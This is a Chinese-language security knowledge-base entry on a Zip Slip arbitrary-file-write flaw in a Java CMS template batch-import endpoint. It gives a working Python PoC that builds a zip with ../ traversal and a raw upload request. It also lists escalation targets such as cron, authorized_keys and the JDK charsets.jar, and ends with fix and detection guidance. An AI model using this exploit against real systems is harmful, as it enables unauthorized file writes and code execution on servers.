---
id: web-generic-file-upload-template-batchimport-zipslip-arbitrary-write
title: 模板批量导入 batchImport Zip Slip：条目名 ../ 穿越写任意文件
type: scenario
domain: web
path: web/generic/file-upload
technique: template-batchimport-zipslip-arbitrary-write
tags:
- java
- spring
- file-upload
- zip
- path-traversal
- arbitrary-write
- template
- jeecms
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V138
  verified_at: '2026-11-06T05:47:00+08:00'
  notes: 已对照原文及截图22-26核对：TemplateController.batchImport 仅校验 zip 类型/后缀，TplLocalServiceImpl.batchImport 遍历 ZipEntry.getName() 并 tplPath+separator+name 拼 new File/写文件，无 ../ 校验；实测 relativePath=/mobile + 含 ../../tmp/tmp.1 条目的 zip 成功，rightList 见 /tmp/tmp.1，宿主 ls /tmp 出现 tmp.1。版本 X2.10 为 demo 显示，已清除 affected_versions。未验证点：未复跑 PoC。
url: /docs/web/generic/file-upload/web-generic-file-upload-template-batchimport-zipslip-arbitrary-write/
draft: false
kb_aliases:
- batchImport
- Zip Slip
- ZipEntry getName
- TplLocalServiceImpl
- 模板批量导入穿越
- JEECMS X2.10
---

## 一句话结论

某 Java CMS 的模板批量导入接口 `POST /server-admin/template/batchImport` 接收 zip 后，在 `TplLocalServiceImpl.batchImport` 中遍历 `ZipEntry`，把 `entry.getName()` 直接拼到模板路径后 `new File(filePath)` 并写入，未校验 `../`、绝对路径或符号链接；攻击者可构造含 `../../../../tmp/tmp.1` 条目的 zip，把任意文件写到解压目录之外。

## 原理

- `TemplateController.batchImport` 接收 `MultipartFile uploadFile`，用 `FileTypeUtil.getType()` 检查类型必须为 zip，并检查文件名后缀；随后调用 `tplService.batchImport(uploadFile, siteId)`。
- `TplLocalServiceImpl.batchImport`：`tplPath = tplPathMethod(siteId, separator)`；`ZipInputStream` 遍历条目；`String name = nextEntry.getName(); String filePath = tplPath + separator + name; File file = new File(filePath);` 目录则 `mkdirs()`，文件则 `createNewFile()` 并写入字节。
- `entry.getName()` 完全由压缩包控制，可包含 `../`、绝对路径、Windows 反斜杠/盘符；`new File` 只拼接字符串，文件系统解析 `..` 后写到解压目录之外。
- 接口只校验“是 zip”和后缀，不校验条目名是否逃逸；因此是标准的 Zip Slip 任意文件写入。
- 写入位置受进程权限限制；示例把 `tmp.1` 写到 `/tmp/`，证明可穿越到系统目录。进一步可写 Web 根、cron、JDK 目录等。
- 注意：Python `zipfile` 在 Windows 上会把 `arcname` 中的 `os.sep` 规范化为 `/`，因此用反斜杠构造的条目名最终以正斜杠存储，Linux 目标也能穿越；直接手写 ZIP 时需用 `/`。

## 触发条件

- 目标为该 CMS/同源代码，`/server-admin/template/batchImport` 可达，调用者持有管理员令牌或接口鉴权缺失。
- 上传文件被识别为 zip（魔数/类型检查通过），后缀校验通过。
- 解压目标目录存在且进程有写权限；目标路径不能是只读文件系统。
- 服务端未对条目名做规范化/前缀校验、未禁用符号链接。

## 利用步骤

1. 获取管理员令牌（如通过 Token 续期拦截器缺陷）。
2. 构造 zip：条目名用 `../../../../.../tmp/tmp.1`（层数按模板根到目标目录调整），内容任意。
3. 以 multipart 上传：`relativePath=/mobile`（或任意合法模板子目录），`uploadFile` 为 zip。
4. 响应 `successfully:true` 后，用目录列举/文件访问确认 `/tmp/tmp.1` 等落点。
5. 若要 RCE，把条目名指向 Web 根脚本、cron、`authorized_keys` 或 JDK `jre/lib/charsets.jar`。

## PoC

```python
import zipfile
with zipfile.ZipFile("compressed.zip", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("../../../../../../../../../../tmp/tmp.1", "This is a test file.")
```

```http
POST /server-admin/template/batchImport HTTP/1.1
Host: target
Token: <admin JWT>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="relativePath"

/mobile
------X
Content-Disposition: form-data; name="uploadFile"; filename="1.zip"
Content-Type: image/jpeg

<zip 字节>
------X--
```

## 变体与关联

- 条目名变体：`..\..\`、绝对路径、盘符、符号链接条目、NUL 截断、先解压到临时目录再移动。
- 写入目标变体：Web 根 JSP/PHP、cron、systemd、`authorized_keys`、JDK `jre/lib/charsets.jar`。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（通用 Zip Slip）、[[web-generic-file-upload-template-relative-path-original-filename-arbitrary-write]]（同 CMS 的上传侧任意写）、[[web-java-classloader-charsets-jar-bootstrap-overwrite-accept-gbk-rce]]（写入 JDK 后的 RCE）。
- 边界：服务端规范化条目名并校验前缀、禁用符号链接、只解压白名单后缀时失效。

## 检测与防御

- 修复：解压前对每个条目 `resolve()` 后用 `startsWith(dest)` 校验；拒绝绝对路径、`..`、盘符、反斜杠与符号链接；只解压白名单后缀。
- 加固：解压到隔离临时目录再安全移动；模板目录与 Web 根/JDK 目录分离；Web 进程降权。
- 检测：zip 条目名含 `../`、绝对路径、反斜杠；解压目录之外出现新文件；`/tmp`、Web 根、JDK 目录出现异常文件。
- 审计：搜索 `ZipInputStream`、`getNextEntry`、`getName()`、`new File(`、`createNewFile()`。
